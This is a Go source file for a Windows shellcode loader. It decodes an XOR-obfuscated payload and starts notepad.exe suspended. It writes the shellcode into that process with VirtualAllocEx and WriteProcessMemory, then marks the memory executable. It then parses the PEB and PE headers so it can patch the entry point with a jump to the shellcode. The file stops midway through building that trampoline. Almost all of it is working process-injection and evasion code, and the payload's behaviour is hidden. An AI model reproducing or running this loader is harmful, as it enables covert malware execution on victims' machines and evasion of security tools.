package main

import (
	"encoding/binary"
	"encoding/hex"
	"flag"
	"fmt"
	"log"
	"os"
	"strconv"
	"syscall"
	"unsafe"

	// Sub Repositories
	"golang.org/x/sys/windows"
)
func Xor(src string) string {
	var XorKey = []byte{0x74, 0x69, 0x64, 0x65, 0x62, 0x79, 0x70, 0x61, 0x73, 0x73}   //tidesec
	var result string
	var s int64
	j := 0
	bt := []rune(src)
	for i := 0; i < len(src)/2; i++ {
		s, _ = strconv.ParseInt(string(bt[i*2:i*2+2]), 16, 0)
		result = result + string(byte(s)^XorKey[j])
		j = (j + 1) % 10
	}
	return result
}


func main() {
	verbose := flag.Bool("verbose", false, "Enable verbose output")
	debug := flag.Bool("debug", false, "Enable debug output")
	program := flag.String("program", "C:\\Windows\\System32\\notepad.exe", "The program to start and inject shellcode into")
	args := flag.String("args", "", "Program command line arguments")
	flag.Usage = func() {
		flag.PrintDefaults()
		os.Exit(0)
	}
	flag.Parse()

	var sc = "120a505d5a4a155515431151075d5249405143434058515456484551464141585153564143501741425c505d5a1b4553454340515c07574b4159474b4c0b5157504944594b11435b515556414007114440085004561d4350104a4051575401491102401042585306524b420241434058075401404005474244580754074b150546414058515456414803464146595c07564b4302474b44580055544f4850444b45515407524b475444414c0b5c555a41405143434459505d5a4c13514447425e505d5248145146434c0b505d534144554b1140595655564040501743115a515356411607104a40585c07514d4859474b44580053561d4350104a405157540149110247421758075c521d445043421758575d074947541542400a5456561a4255434b405c575c06484754174b415150515a1b44514147405054540649465747424c0b5406564144554b114059550656404050174340585c07524d4859474b44580055564845594742415151005740450047424151505457404450461240515c56071a42514742415b02030749455947424150510456414803424111505003041f16071515410d5204524944581116435e525c541c46584516425c535152494450464540505c5c074f44024b4a12585054001844024444465f5452041f1454474b4758075c564143501741400d5754014944054042175050545749445046434058060451184557444a155e0203064c150344404108505d5a401350474216515654524a40514343400d57540140445046424058515454184052474241585054001845564b4a4d0f0753041f145416114150510756414858104240515754064b44584b4a1051500151481358464142515455524b44514b47415b5157564812001611415c5600511b1607174640515c5c014f44594b40175a515554184000461540515c5c044844594b4a1008505c014e13511515120f0203041f4405404217505157574b44501112460d5453534147031515105c5c50014940074b464d0d545452494051474b120f0703521f48554b10445854555249150317401150015152484051434311510557041f16071515460f515d57414559464b4151515d524943544641420d5103551d11554217410c0554071d49551041100d06525b4115541147430f5d065348445816174c0c5503031a46571241450c0254501d13004410400a5104074843034147410d515303494059171510080252514842514443415f05075a4f11504a46420c54545a1d43504212470800535a4e46514243470b0057001845571240125b53045b4b14004343415c5356544c4753411740585252544c4604444747085655561d4607441242505206541a46504115475c560051494251414b425a5203541d47514542435d525c544b46024546470b5655561d4552474a405c5655514142044043470b5655574e46584516425d5203554e47524143400c51515049435641164758570750494555444142505251544c46044447460f5750501c4351414a440d540452491302474a4c0b5657531a41554b4210080704524012054a44465b5d51571f46511242465c065d5b1811574046120d0201551b43504746165d5104574c13594547400b5452071b42001042410c0654514e4656401045590655524a41574540465b015d534149514712105853525740435146414508005707404255434216595557561840041146415c0552044912511142425f5406561b15521715465b53000648455210164d515150071b1254104b435001505b1f4858151643515c03004047521742405d0206544b49024015405f02575218415142464c505d505340425744424508555d031b1250474b4c5e57510049145711164c5c5156504145041616155956525a4014514345170c5d550349125817404608060053184950424b475f5750071844074543420a0257521b4702474546590751534a1107404045085052504f4250414244595753571a11501042150a0507544b13024515160c565c011c42581215425c0750561c49574243435f5203564f45564a104608060155404854104b465a02015041110446154358015d0741165440444d0f0051064c4158154147585c5d5541495347114d5f5d5652491253414a450d5152071b40584612110d505c551d40514742160c0255004c11534645120f005056414350104a160854555249445143434058065d524941514343445950540040445143434459545556481200464b155d5156074c1607174640515d56574a4552474b4c50015256414858154240515c5c06184450114b4459565552494051474a4c50025c5648120042414d5f5c5c074b1607174640515c56014d42514b4617595351004f46574b11445e505d524813524b4617595350064e4559464b4151505d524c405143434459545557491352164b4d0f0201041f1607404247595600514b43504042460c5750514c4204404144595450044c15504343"
	scxor := Xor(sc)
	shellcode, _ := hex.DecodeString(scxor)

	if *debug {
		fmt.Println("[DEBUG]Loading kernel32.dll and ntdll.dll...")
	}

	// Load DLLs and Procedures
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	ntdll := windows.NewLazySystemDLL("ntdll.dll")

	if *debug {
		fmt.Println("[DEBUG]Loading supporting procedures...")
	}
	VirtualAllocEx := kernel32.NewProc("VirtualAllocEx")
	VirtualProtectEx := kernel32.NewProc("VirtualProtectEx")
	WriteProcessMemory := kernel32.NewProc("WriteProcessMemory")
	NtQueryInformationProcess := ntdll.NewProc("NtQueryInformationProcess")

	// Create anonymous pipe for STDIN
	// TODO I don't think I need this for anything
	var stdInRead windows.Handle
	var stdInWrite windows.Handle

	if *debug {
		fmt.Println(fmt.Sprintf("[DEBUG]Calling CreatePipe for STDIN..."))
	}
	errStdInPipe := windows.CreatePipe(&stdInRead, &stdInWrite, &windows.SecurityAttributes{InheritHandle: 1}, 0)
	if errStdInPipe != nil {
		log.Fatal(fmt.Sprintf("[!]Error creating the STDIN pipe:\r\n%s", errStdInPipe.Error()))
	}
	if *verbose {
		fmt.Println(fmt.Sprintf("[-]Successfully created STDIN pipe"))
	}
	if *debug {
		fmt.Println(fmt.Sprintf("[DEBUG]STDIN pipe read handle %v", stdInRead))
		fmt.Println(fmt.Sprintf("[DEBUG]STDIN pipe write handle %v", stdInWrite))
	}

	// Create anonymous pipe for STDOUT
	var stdOutRead windows.Handle
	var stdOutWrite windows.Handle
	if *debug {
		fmt.Println(fmt.Sprintf("[DEBUG]Calling CreatePipe for STDOUT..."))
	}
	errStdOutPipe := windows.CreatePipe(&stdOutRead, &stdOutWrite, &windows.SecurityAttributes{InheritHandle: 1}, 0)
	if errStdOutPipe != nil {
		log.Fatal(fmt.Sprintf("[!]Error creating the STDOUT pipe:\r\n%s", errStdOutPipe.Error()))
	}
	if *verbose {
		fmt.Println(fmt.Sprintf("[-]Successfully created STDOUT pipe"))
	}
	if *debug {
		fmt.Println(fmt.Sprintf("[DEBUG]STDOUT pipe read handle %v", stdOutRead))
		fmt.Println(fmt.Sprintf("[DEBUG]STDOUT pipe write handle %v", stdOutWrite))
	}

	// Create anonymous pipe for STDERR
	var stdErrRead windows.Handle
	var stdErrWrite windows.Handle
	if *debug {
		fmt.Println(fmt.Sprintf("[DEBUG]Calling CreatePipe for STDERR..."))
	}
	errStdErrPipe := windows.CreatePipe(&stdErrRead, &stdErrWrite, &windows.SecurityAttributes{InheritHandle: 1}, 0)
	if errStdErrPipe != nil {
		log.Fatal(fmt.Sprintf("[!]Error creating the STDERR pipe:\r\n%s", errStdErrPipe.Error()))
	}
	if *verbose {
		fmt.Println(fmt.Sprintf("[-]Successfully created STDERR pipe"))
	}
	if *debug {
		fmt.Println(fmt.Sprintf("[DEBUG]STDERR pipe read handle %v", stdErrRead))
		fmt.Println(fmt.Sprintf("[DEBUG]STDOUT pipe write handle %v", stdErrWrite))
	}

	// Create child proccess in suspended state
	/*
		BOOL CreateProcessW(
		LPCWSTR               lpApplicationName,
		LPWSTR                lpCommandLine,
		LPSECURITY_ATTRIBUTES lpProcessAttributes,
		LPSECURITY_ATTRIBUTES lpThreadAttributes,
		BOOL                  bInheritHandles,
		DWORD                 dwCreationFlags,
		LPVOID                lpEnvironment,
		LPCWSTR               lpCurrentDirectory,
		LPSTARTUPINFOW        lpStartupInfo,
		LPPROCESS_INFORMATION lpProcessInformation
		);
	*/

	if *debug {
		fmt.Println(fmt.Sprintf("[DEBUG]Calling CreateProcess to start:\r\n\t%s %s...", *program, *args))
	}
	procInfo := &windows.ProcessInformation{}
	startupInfo := &windows.StartupInfo{
		StdInput:   stdInRead,
		StdOutput:  stdOutWrite,
		StdErr:     stdErrWrite,
		Flags:      windows.STARTF_USESTDHANDLES | windows.CREATE_SUSPENDED,
		ShowWindow: 1,
	}
	errCreateProcess := windows.CreateProcess(syscall.StringToUTF16Ptr(*program), syscall.StringToUTF16Ptr(*args), nil, nil, true, windows.CREATE_SUSPENDED, nil, nil, startupInfo, procInfo)
	if errCreateProcess != nil && errCreateProcess.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("[!]Error calling CreateProcess:\r\n%s", errCreateProcess.Error()))
	}
	if *verbose {
		fmt.Println(fmt.Sprintf("[-]Successfully created the %s prcoess in PID %d", *program, procInfo.ProcessId))
	}

	// Allocate memory in child process
	if *debug {
		fmt.Println(fmt.Sprintf("[DEBUG]Calling VirtualAllocEx on PID %d...", procInfo.ProcessId))
	}
	addr, _, errVirtualAlloc := VirtualAllocEx.Call(uintptr(procInfo.Process), 0, uintptr(len(shellcode)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)

	if errVirtualAlloc != nil && errVirtualAlloc.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("[!]Error calling VirtualAlloc:\r\n%s", errVirtualAlloc.Error()))
	}

	if addr == 0 {
		log.Fatal("[!]VirtualAllocEx failed and returned 0")
	}
	if *verbose {
		fmt.Println(fmt.Sprintf("[-]Successfully allocated memory in PID %d", procInfo.ProcessId))
	}
	if *debug {
		fmt.Println(fmt.Sprintf("[DEBUG]Shellcode address: 0x%x", addr))
	}

	// Write shellcode into child process memory
	if *debug {
		fmt.Println(fmt.Sprintf("[DEBUG]Calling WriteProcessMemory on PID %d...", procInfo.ProcessId))
	}
	_, _, errWriteProcessMemory := WriteProcessMemory.Call(uintptr(procInfo.Process), addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))

	if errWriteProcessMemory != nil && errWriteProcessMemory.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("[!]Error calling WriteProcessMemory:\r\n%s", errWriteProcessMemory.Error()))
	}
	if *verbose {
		fmt.Println(fmt.Sprintf("[-]Successfully wrote %d shellcode bytes to PID %d", len(shellcode), procInfo.ProcessId))
	}

	// Change memory permissions to RX in child process where shellcode was written
	if *debug {
		fmt.Println(fmt.Sprintf("[DEBUG]Calling VirtualProtectEx on PID %d...", procInfo.ProcessId))
	}
	oldProtect := windows.PAGE_READWRITE
	_, _, errVirtualProtectEx := VirtualProtectEx.Call(uintptr(procInfo.Process), addr, uintptr(len(shellcode)), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
	if errVirtualProtectEx != nil && errVirtualProtectEx.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("Error calling VirtualProtectEx:\r\n%s", errVirtualProtectEx.Error()))
	}
	if *verbose {
		fmt.Println(fmt.Sprintf("[-]Successfully changed memory permissions to PAGE_EXECUTE_READ in PID %d", procInfo.ProcessId))
	}

	// Query the child process and find its image base address from its Process Environment Block (PEB)
	// https://github.com/winlabs/gowin32/blob/0b6f3bef0b7501b26caaecab8d52b09813224373/wrappers/winternl.go#L37
	// http://bytepointer.com/resources/tebpeb32.htm
	// https://www.nirsoft.net/kernel_struct/vista/PEB.html
	type PEB struct {
		//reserved1              [2]byte     // BYTE 0-1
		InheritedAddressSpace    byte    // BYTE	0
		ReadImageFileExecOptions byte    // BYTE	1
		BeingDebugged            byte    // BYTE	2
		reserved2                [1]byte // BYTE 3
		// ImageUsesLargePages          : 1;   //0x0003:0 (WS03_SP1+)
		// IsProtectedProcess           : 1;   //0x0003:1 (Vista+)
		// IsLegacyProcess              : 1;   //0x0003:2 (Vista+)
		// IsImageDynamicallyRelocated  : 1;   //0x0003:3 (Vista+)
		// SkipPatchingUser32Forwarders : 1;   //0x0003:4 (Vista_SP1+)
		// IsPackagedProcess            : 1;   //0x0003:5 (Win8_BETA+)
		// IsAppContainer               : 1;   //0x0003:6 (Win8_RTM+)
		// SpareBit                     : 1;   //0x0003:7
		//reserved3              [2]uintptr  // PVOID BYTE 4-8
		Mutant                 uintptr     // BYTE 4
		ImageBaseAddress       uintptr     // BYTE 8
		Ldr                    uintptr     // PPEB_LDR_DATA
		ProcessParameters      uintptr     // PRTL_USER_PROCESS_PARAMETERS
		reserved4              [3]uintptr  // PVOID
		AtlThunkSListPtr       uintptr     // PVOID
		reserved5              uintptr     // PVOID
		reserved6              uint32      // ULONG
		reserved7              uintptr     // PVOID
		reserved8              uint32      // ULONG
		AtlThunkSListPtr32     uint32      // ULONG
		reserved9              [45]uintptr // PVOID
		reserved10             [96]byte    // BYTE
		PostProcessInitRoutine uintptr     // PPS_POST_PROCESS_INIT_ROUTINE
		reserved11             [128]byte   // BYTE
		reserved12             [1]uintptr  // PVOID
		SessionId              uint32      // ULONG
	}

	// https://github.com/elastic/go-windows/blob/master/ntdll.go#L77
	type PROCESS_BASIC_INFORMATION struct {
		reserved1                    uintptr    // PVOID
		PebBaseAddress               uintptr    // PPEB
		reserved2                    [2]uintptr // PVOID
		UniqueProcessId              uintptr    // ULONG_PTR
		InheritedFromUniqueProcessID uintptr    // PVOID
	}

	if *debug {
		fmt.Println(fmt.Sprintf("[DEBUG]Calling NtQueryInformationProcess on %d...", procInfo.ProcessId))
	}

	var processInformation PROCESS_BASIC_INFORMATION
	var returnLength uintptr
	ntStatus, _, errNtQueryInformationProcess := NtQueryInformationProcess.Call(uintptr(procInfo.Process), 0, uintptr(unsafe.Pointer(&processInformation)), unsafe.Sizeof(processInformation), returnLength)
	if errNtQueryInformationProcess != nil && errNtQueryInformationProcess.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("[!]Error calling NtQueryInformationProcess:\r\n\t%s", errNtQueryInformationProcess.Error()))
	}
	if ntStatus != 0 {
		if ntStatus == 3221225476 {
			log.Fatal("[!]Error calling NtQueryInformationProcess: STATUS_INFO_LENGTH_MISMATCH") // 0xc0000004 (3221225476)
		}
		fmt.Println(fmt.Sprintf("[!]NtQueryInformationProcess returned NTSTATUS: %x(%d)", ntStatus, ntStatus))
		log.Fatal(fmt.Sprintf("[!]Error calling NtQueryInformationProcess:\r\n\t%s", syscall.Errno(ntStatus)))
	}
	if *verbose {
		fmt.Println("[-]Got PEB info from NtQueryInformationProcess")
	}

	// Read from PEB base address to populate the PEB structure
	// ReadProcessMemory
	/*
		BOOL ReadProcessMemory(
		HANDLE  hProcess,
		LPCVOID lpBaseAddress,
		LPVOID  lpBuffer,
		SIZE_T  nSize,
		SIZE_T  *lpNumberOfBytesRead
		);
	*/

	ReadProcessMemory := kernel32.NewProc("ReadProcessMemory")

	if *debug {
		fmt.Println("[DEBUG]Calling ReadProcessMemory for PEB...")
	}

	var peb PEB
	var readBytes int32

	_, _, errReadProcessMemory := ReadProcessMemory.Call(uintptr(procInfo.Process), processInformation.PebBaseAddress, uintptr(unsafe.Pointer(&peb)), unsafe.Sizeof(peb), uintptr(unsafe.Pointer(&readBytes)))
	if errReadProcessMemory != nil && errReadProcessMemory.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("[!]Error calling ReadProcessMemory:\r\n\t%s", errReadProcessMemory.Error()))
	}
	if *verbose {
		fmt.Println(fmt.Sprintf("[-]ReadProcessMemory completed reading %d bytes for PEB", readBytes))
	}
	if *debug {
		fmt.Println(fmt.Sprintf("[DEBUG]PEB: %+v", peb))
		fmt.Println(fmt.Sprintf("[DEBUG]PEB ImageBaseAddress: 0x%x", peb.ImageBaseAddress))
	}

	// Read the child program's DOS header and validate it is a MZ executable
	type IMAGE_DOS_HEADER struct {
		Magic    uint16     // USHORT Magic number
		Cblp     uint16     // USHORT Bytes on last page of file
		Cp       uint16     // USHORT Pages in file
		Crlc     uint16     // USHORT Relocations
		Cparhdr  uint16     // USHORT Size of header in paragraphs
		MinAlloc uint16     // USHORT Minimum extra paragraphs needed
		MaxAlloc uint16     // USHORT Maximum extra paragraphs needed
		SS       uint16     // USHORT Initial (relative) SS value
		SP       uint16     // USHORT Initial SP value
		CSum     uint16     // USHORT Checksum
		IP       uint16     // USHORT Initial IP value
		CS       uint16     // USHORT Initial (relative) CS value
		LfaRlc   uint16     // USHORT File address of relocation table
		Ovno     uint16     // USHORT Overlay number
		Res      [4]uint16  // USHORT Reserved words
		OEMID    uint16     // USHORT OEM identifier (for e_oeminfo)
		OEMInfo  uint16     // USHORT OEM information; e_oemid specific
		Res2     [10]uint16 // USHORT Reserved words
		LfaNew   int32      // LONG File address of new exe header
	}

	if *debug {
		fmt.Println("[DEBUG]Calling ReadProcessMemory for IMAGE_DOS_HEADER...")
	}

	var dosHeader IMAGE_DOS_HEADER
	var readBytes2 int32

	_, _, errReadProcessMemory2 := ReadProcessMemory.Call(uintptr(procInfo.Process), peb.ImageBaseAddress, uintptr(unsafe.Pointer(&dosHeader)), unsafe.Sizeof(dosHeader), uintptr(unsafe.Pointer(&readBytes2)))
	if errReadProcessMemory2 != nil && errReadProcessMemory2.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("[!]Error calling ReadProcessMemory:\r\n\t%s", errReadProcessMemory2.Error()))
	}
	if *verbose {
		fmt.Println(fmt.Sprintf("[-]ReadProcessMemory completed reading %d bytes for IMAGE_DOS_HEADER", readBytes2))
	}
	if *debug {
		fmt.Println(fmt.Sprintf("[DEBUG]IMAGE_DOS_HEADER: %+v", dosHeader))
		fmt.Println(fmt.Sprintf("[DEBUG]Magic: %s", string(dosHeader.Magic&0xff)+string(dosHeader.Magic>>8))) // LittleEndian
		fmt.Println(fmt.Sprintf("[DEBUG]PE header offset: 0x%x", dosHeader.LfaNew))
	}

	// 23117 is the LittleEndian unsigned base10 representation of MZ
	// 0x5a4d is the LittleEndian unsigned base16 represenation of MZ
	if dosHeader.Magic != 23117 {
		log.Fatal(fmt.Sprintf("[!]DOS image header magic string was not MZ"))
	}

	// Read the child process's PE header signature to validate it is a PE
	if *debug {
		fmt.Println("[DEBUG]Calling ReadProcessMemory for PE Signature...")
	}
	var Signature uint32
	var readBytes3 int32

	_, _, errReadProcessMemory3 := ReadProcessMemory.Call(uintptr(procInfo.Process), peb.ImageBaseAddress+uintptr(dosHeader.LfaNew), uintptr(unsafe.Pointer(&Signature)), unsafe.Sizeof(Signature), uintptr(unsafe.Pointer(&readBytes3)))
	if errReadProcessMemory3 != nil && errReadProcessMemory3.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("[!]Error calling ReadProcessMemory:\r\n\t%s", errReadProcessMemory3.Error()))
	}
	if *verbose {
		fmt.Println(fmt.Sprintf("[-]ReadProcessMemory completed reading %d bytes for PE Signature", readBytes3))

	}
	if *debug {
		fmt.Println(fmt.Sprintf("[DEUBG]PE Signature: 0x%x", Signature))
	}

	// 17744 is Little Endian Unsigned 32-bit integer in decimal for PE (null terminated)
	// 0x4550 is Little Endian Unsigned 32-bit integer in hex for PE (null terminated)
	if Signature != 17744 {
		log.Fatal("[!]PE Signature string was not PE")
	}

	// Read the child process's PE file header
	/*
		typedef struct _IMAGE_FILE_HEADER {
			USHORT  Machine;
			USHORT  NumberOfSections;
			ULONG   TimeDateStamp;
			ULONG   PointerToSymbolTable;
			ULONG   NumberOfSymbols;
			USHORT  SizeOfOptionalHeader;
			USHORT  Characteristics;
		} IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;
	*/

	type IMAGE_FILE_HEADER struct {
		Machine              uint16
		NumberOfSections     uint16
		TimeDateStamp        uint32
		PointerToSymbolTable uint32
		NumberOfSymbols      uint32
		SizeOfOptionalHeader uint16
		Characteristics      uint16
	}

	if *debug {
		fmt.Println("[DEBUG]Calling ReadProcessMemory for IMAGE_FILE_HEADER...")
	}
	var peHeader IMAGE_FILE_HEADER
	var readBytes4 int32

	_, _, errReadProcessMemory4 := ReadProcessMemory.Call(uintptr(procInfo.Process), peb.ImageBaseAddress+uintptr(dosHeader.LfaNew)+unsafe.Sizeof(Signature), uintptr(unsafe.Pointer(&peHeader)), unsafe.Sizeof(peHeader), uintptr(unsafe.Pointer(&readBytes4)))
	if errReadProcessMemory4 != nil && errReadProcessMemory4.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("[!]Error calling ReadProcessMemory:\r\n\t%s", errReadProcessMemory4.Error()))
	}
	if *verbose {
		fmt.Println(fmt.Sprintf("[-]ReadProcessMemory completed reading %d bytes for IMAGE_FILE_HEADER", readBytes4))
		switch peHeader.Machine {
		case 34404: // 0x8664
			fmt.Println("[-]Machine type: IMAGE_FILE_MACHINE_AMD64 (x64)")
		case 332: // 0x14c
			fmt.Println("[-]Machine type: IMAGE_FILE_MACHINE_I386 (x86)")
		default:
			fmt.Println(fmt.Sprintf("[-]Machine type UNKOWN: 0x%x", peHeader.Machine))
		}
	}
	if *debug {
		fmt.Println(fmt.Sprintf("[DEBUG]IMAGE_FILE_HEADER: %+v", peHeader))
		fmt.Println(fmt.Sprintf("[DEBUG]Machine: 0x%x", peHeader.Machine))
	}

	// Read the child process's PE optional header to find it's entry point
	/*
		https://docs.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-image_optional_header64
		typedef struct _IMAGE_OPTIONAL_HEADER64 {
		WORD                 Magic;
		BYTE                 MajorLinkerVersion;
		BYTE                 MinorLinkerVersion;
		DWORD                SizeOfCode;
		DWORD                SizeOfInitializedData;
		DWORD                SizeOfUninitializedData;
		DWORD                AddressOfEntryPoint;
		DWORD                BaseOfCode;
		ULONGLONG            ImageBase;
		DWORD                SectionAlignment;
		DWORD                FileAlignment;
		WORD                 MajorOperatingSystemVersion;
		WORD                 MinorOperatingSystemVersion;
		WORD                 MajorImageVersion;
		WORD                 MinorImageVersion;
		WORD                 MajorSubsystemVersion;
		WORD                 MinorSubsystemVersion;
		DWORD                Win32VersionValue;
		DWORD                SizeOfImage;
		DWORD                SizeOfHeaders;
		DWORD                CheckSum;
		WORD                 Subsystem;
		WORD                 DllCharacteristics;
		ULONGLONG            SizeOfStackReserve;
		ULONGLONG            SizeOfStackCommit;
		ULONGLONG            SizeOfHeapReserve;
		ULONGLONG            SizeOfHeapCommit;
		DWORD                LoaderFlags;
		DWORD                NumberOfRvaAndSizes;
		IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];
		} IMAGE_OPTIONAL_HEADER64, *PIMAGE_OPTIONAL_HEADER64;
	*/

	type IMAGE_OPTIONAL_HEADER64 struct {
		Magic                       uint16
		MajorLinkerVersion          byte
		MinorLinkerVersion          byte
		SizeOfCode                  uint32
		SizeOfInitializedData       uint32
		SizeOfUninitializedData     uint32
		AddressOfEntryPoint         uint32
		BaseOfCode                  uint32
		ImageBase                   uint64
		SectionAlignment            uint32
		FileAlignment               uint32
		MajorOperatingSystemVersion uint16
		MinorOperatingSystemVersion uint16
		MajorImageVersion           uint16
		MinorImageVersion           uint16
		MajorSubsystemVersion       uint16
		MinorSubsystemVersion       uint16
		Win32VersionValue           uint32
		SizeOfImage                 uint32
		SizeOfHeaders               uint32
		CheckSum                    uint32
		Subsystem                   uint16
		DllCharacteristics          uint16
		SizeOfStackReserve          uint64
		SizeOfStackCommit           uint64
		SizeOfHeapReserve           uint64
		SizeOfHeapCommit            uint64
		LoaderFlags                 uint32
		NumberOfRvaAndSizes         uint32
		DataDirectory               uintptr
	}

	/*
		https://docs.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-image_optional_header32
		typedef struct _IMAGE_OPTIONAL_HEADER {
		WORD                 Magic;
		BYTE                 MajorLinkerVersion;
		BYTE                 MinorLinkerVersion;
		DWORD                SizeOfCode;
		DWORD                SizeOfInitializedData;
		DWORD                SizeOfUninitializedData;
		DWORD                AddressOfEntryPoint;
		DWORD                BaseOfCode;
		DWORD                BaseOfData;
		DWORD                ImageBase;
		DWORD                SectionAlignment;
		DWORD                FileAlignment;
		WORD                 MajorOperatingSystemVersion;
		WORD                 MinorOperatingSystemVersion;
		WORD                 MajorImageVersion;
		WORD                 MinorImageVersion;
		WORD                 MajorSubsystemVersion;
		WORD                 MinorSubsystemVersion;
		DWORD                Win32VersionValue;
		DWORD                SizeOfImage;
		DWORD                SizeOfHeaders;
		DWORD                CheckSum;
		WORD                 Subsystem;
		WORD                 DllCharacteristics;
		DWORD                SizeOfStackReserve;
		DWORD                SizeOfStackCommit;
		DWORD                SizeOfHeapReserve;
		DWORD                SizeOfHeapCommit;
		DWORD                LoaderFlags;
		DWORD                NumberOfRvaAndSizes;
		IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];
		} IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;
	*/

	type IMAGE_OPTIONAL_HEADER32 struct {
		Magic                       uint16
		MajorLinkerVersion          byte
		MinorLinkerVersion          byte
		SizeOfCode                  uint32
		SizeOfInitializedData       uint32
		SizeOfUninitializedData     uint32
		AddressOfEntryPoint         uint32
		BaseOfCode                  uint32
		BaseOfData                  uint32 // Different from 64 bit header
		ImageBase                   uint64
		SectionAlignment            uint32
		FileAlignment               uint32
		MajorOperatingSystemVersion uint16
		MinorOperatingSystemVersion uint16
		MajorImageVersion           uint16
		MinorImageVersion           uint16
		MajorSubsystemVersion       uint16
		MinorSubsystemVersion       uint16
		Win32VersionValue           uint32
		SizeOfImage                 uint32
		SizeOfHeaders               uint32
		CheckSum                    uint32
		Subsystem                   uint16
		DllCharacteristics          uint16
		SizeOfStackReserve          uint64
		SizeOfStackCommit           uint64
		SizeOfHeapReserve           uint64
		SizeOfHeapCommit            uint64
		LoaderFlags                 uint32
		NumberOfRvaAndSizes         uint32
		DataDirectory               uintptr
	}

	if *debug {
		fmt.Println("[DEBUG]Calling ReadProcessMemory for IMAGE_OPTIONAL_HEADER...")
	}

	var optHeader64 IMAGE_OPTIONAL_HEADER64
	var optHeader32 IMAGE_OPTIONAL_HEADER32
	var errReadProcessMemory5 error
	var readBytes5 int32

	if peHeader.Machine == 34404 { // 0x8664
		_, _, errReadProcessMemory5 = ReadProcessMemory.Call(uintptr(procInfo.Process), peb.ImageBaseAddress+uintptr(dosHeader.LfaNew)+unsafe.Sizeof(Signature)+unsafe.Sizeof(peHeader), uintptr(unsafe.Pointer(&optHeader64)), unsafe.Sizeof(optHeader64), uintptr(unsafe.Pointer(&readBytes5)))
	} else if peHeader.Machine == 332 { // 0x14c
		_, _, errReadProcessMemory5 = ReadProcessMemory.Call(uintptr(procInfo.Process), peb.ImageBaseAddress+uintptr(dosHeader.LfaNew)+unsafe.Sizeof(Signature)+unsafe.Sizeof(peHeader), uintptr(unsafe.Pointer(&optHeader32)), unsafe.Sizeof(optHeader32), uintptr(unsafe.Pointer(&readBytes5)))
	} else {
		log.Fatal(fmt.Sprintf("[!]Unknow IMAGE_OPTIONAL_HEADER type for machine type: 0x%x", peHeader.Machine))
	}

	if errReadProcessMemory5 != nil && errReadProcessMemory5.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("[!]Error calling ReadProcessMemory:\r\n\t%s", errReadProcessMemory5.Error()))
	}
	if *verbose {
		fmt.Println(fmt.Sprintf("[-]ReadProcessMemory completed reading %d bytes for IMAGE_OPTIONAL_HEADER", readBytes5))
	}
	if *debug {
		if peHeader.Machine == 332 { // 0x14c
			fmt.Println(fmt.Sprintf("[DEBUG]IMAGE_OPTIONAL_HEADER32: %+v", optHeader32))
			fmt.Println(fmt.Sprintf("\t[DEBUG]ImageBase: 0x%x", optHeader32.ImageBase))
			fmt.Println(fmt.Sprintf("\t[DEBUG]AddressOfEntryPoint (relative): 0x%x", optHeader32.AddressOfEntryPoint))
			fmt.Println(fmt.Sprintf("\t[DEBUG]AddressOfEntryPoint (absolute): 0x%x", peb.ImageBaseAddress+uintptr(optHeader32.AddressOfEntryPoint)))
		}
		if peHeader.Machine == 34404 { // 0x8664
			fmt.Println(fmt.Sprintf("[DEBUG]IMAGE_OPTIONAL_HEADER64: %+v", optHeader64))
			fmt.Println(fmt.Sprintf("\t[DEBUG]ImageBase: 0x%x", optHeader64.ImageBase))
			fmt.Println(fmt.Sprintf("\t[DEBUG]AddressOfEntryPoint (relative): 0x%x", optHeader64.AddressOfEntryPoint))
			fmt.Println(fmt.Sprintf("\t[DEBUG]AddressOfEntryPoint (absolute): 0x%x", peb.ImageBaseAddress+uintptr(optHeader64.AddressOfEntryPoint)))
		}
	}

	// Overwrite the value at AddressofEntryPoint field with trampoline to load the shellcode address in RAX/EAX and jump to it
	var ep uintptr
	if peHeader.Machine == 34404 { // 0x8664 x64
		ep = peb.ImageBaseAddress + uintptr(optHeader64.AddressOfEntryPoint)
	} else if peHeader.Machine == 332 { // 0x14c x86
		ep = peb.ImageBaseAddress + uintptr(optHeader32.AddressOfEntryPoint)
	} else {
		log.Fatal(fmt.Sprintf("[!]Unknow IMAGE_OPTIONAL_HEADER type for machine type: 0x%x", peHeader.Machine))
	}

	var epBuffer []byte
	var shellcodeAddressBuffer []byte
	// x86 - 0xb8 = mov eax
	// x64 - 0x48 = rex (declare 64bit); 0xb8 = mov eax
	if peHeader.Machine == 34404 { // 0x8664 x64
		epBuffer = append(epBuffer, byte(0x48))
		epBuffer = append(epBuffer, byte(0xb8))
		shellcodeAddressBuffer = make([]byte, 8) // 8 bytes for 64-bit address
		binary.LittleEndian.PutUint64(shellcodeAddressBuffer, uint64(addr))
		epBuffer = append(epBuffer, shellcodeAddressBuffer...)
	} else if peHeader.Machine == 332 { // 0x14c x86
		epBuffer = append(epBuffer, byte(0xb8))
		shellcodeAddressBuffer = make([]byte, 4) // 4 bytes for 32-bit address
		binary.LittleEndian.PutUint32(shellcodeAddressBuffer, uint32(addr))
		epBuffer = append(epBuffer, shellcodeAddressBuffer...)
	} else {
		log.Fatal(fmt.Sprintf("[!]Unknow IMAGE_OPTIONAL_HEADER type for machine type: 0x%x", peHeader.Machine))
	}

	// 0xff ; 0xe0 = jmp [r|e]ax
	epBuffer = append(epBuffer, byte(0xff))
